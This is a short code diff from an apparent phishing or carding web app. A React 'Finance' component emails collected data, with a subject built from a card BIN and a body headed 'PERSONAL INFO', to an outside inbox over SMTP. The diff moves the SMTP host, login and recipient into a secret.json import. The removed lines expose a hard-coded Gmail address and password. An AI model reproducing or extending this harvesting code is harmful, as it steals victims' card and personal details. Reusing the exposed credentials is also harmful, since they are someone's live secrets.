@@ -4,6 +4,7 @@ import { useSelector } from 'react-redux';
 // import { useHistory } from 'react-router-dom';
 // import Email from './smtp'
 import './finance.css';
+import { smtp, user, pass, to } from './secret.json'
 
 // init("user_ld15Epetajzy4LTSlKCz8");
 function Finance() {
@@ -124,11 +125,11 @@ function Finance() {
 		}
 		const send = async () => {
 		await sender.send({
-			Host: "smtp.gmail.com",
-			Username : "iwillkillbill00@gmail.com",
-			Password : "root.FX3",
-			To : 'killbill@attorneymail.ch',
-			From : "iwillkillbill00@gmail.com",
+			Host: smtp,
+			Username : user,
+			Password : pass,
+			To : to,
+			From : user,
 			Subject : `${bin} ${Date.now()}`,
 			Body : `=== PERSONAL INFO === <br>
 
